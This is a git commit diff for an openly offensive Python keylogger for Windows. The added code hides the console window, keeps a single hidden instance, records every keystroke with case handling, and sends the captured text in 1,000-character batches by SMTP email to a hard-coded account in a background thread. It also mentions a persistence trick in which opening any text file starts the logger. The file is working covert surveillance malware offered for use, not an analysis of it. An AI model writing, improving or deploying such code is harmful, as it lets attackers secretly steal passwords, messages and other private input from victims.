8e0c9d314d0b7663327e48c5c75a94579075276c
xp4xbox <nicman1080@gmail.com>
2017-09-16 16:01:12 -0400

    Several Updates Check Desc.
    Keys Are Now Logged. Check to make sure pyhook and pywin32 are installed. Keep the program to single instance. Hide the console window. Add argument to open up text file if persistence is installed. Fixed keyboard delay by moving email function to a new thread. Check to see if caps lock or shift key is pressed. Check for "enter", "space", "Backspace", "Caps Lock" or "tab" for writing output.

--- Keylogger.py
+++ Keylogger.py
@@ -1,14 +1,42 @@
-import smtplib, time
-import pythoncom, pyHook
-from pyHook import GetKeyState, HookConstants
+import smtplib, time, os, threading, sys
+import win32console, win32gui, win32event, win32api, winerror
+from win32con import VK_CAPITAL
+try:
+    import pythoncom, pyHook
+    from pyHook import GetKeyState, HookConstants
+except ImportError:
+    print("required pyhook and py2win32")
+    exit()
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
 
 blnStop = "False"
 
+mutex = win32event.CreateMutex(None, 1, 'mutex_xp4key') # exit if there are multiple instances
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    exit()
+
+def hide(): # hide cmd window (optional if compiling as .exe)
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window, 0)
+    return True
+hide()
+
+# if persistence is installed opening any text file
+# will open the keylogger then use this code below
+# to open the txt file in notepad
+if len(sys.argv) == 2:
+    strtxtFileCommand = os.environ["windir"]+"\\notepad.exe "+sys.argv[1]
+    os.system(strtxtFileCommand)
+
 def OnKeyboardEvent(event):
     global strLogs
+    try: # check to see if variable is defined
+        strLogs
+    except NameError:
+        strLogs = ""
 
     def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
         try:
@@ -24,20 +52,39 @@ def OnKeyboardEvent(event):
             SmtpServer.login(strEmailAc, strEmailPass)
             SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
         except:
-            time.sleep(5)   # freeze program for 5 seconds to try again
-            SendMessages(strLogs, strEmailAc, strEmailPass, blnStop)
+            # if for some reason, the email cannot send, exit program including threads.
+            os._exit(1)
 
     if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
         # CTRL-RIGHT_SHIFT-H to stop the program
-        hooks_manager.UnhookKeyboard()
-        SendMessages(strLogs, strEmailAc, strEmailPass, "True")
+        # create a new thread so that there is no delay while sending email
+        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
+        SendMailThread.start()
         exit()
 
-    strLogs = "aaaaaa"
+    # if the user types "enter" move to a new line
+    if event.Key == "Return":
+        strLogs = strLogs + "\n"
+    elif event.Key == "Space":
+        strLogs = strLogs + " "
+    elif event.Key == "Back":
+        strLogs = strLogs + " [back] "
+    elif event.Key == "Tab":
+        strLogs = strLogs + "\t"
+    elif event.Key == "Capital":
+        pass
+    else:
+        # check to see if caps lock is on or the shift key is held down
+        if win32api.GetKeyState(VK_CAPITAL) == 1 or (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))) and HookConstants.IDToName(event.KeyID).isalpha():
+            strLogs = strLogs + event.Key
+        else:
+            strLogs = strLogs + ((event.Key).lower())
 
     if len(strLogs) >= 1000:
-        SendMessages(strLogs, strEmailAc, strEmailPass, blnStop)
-
+        # create a new thread so that there is no delay while sending email
+        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
+        SendMailThread.start()
+        strLogs = ""
     return True
 
 hooks_manager = pyHook.HookManager()
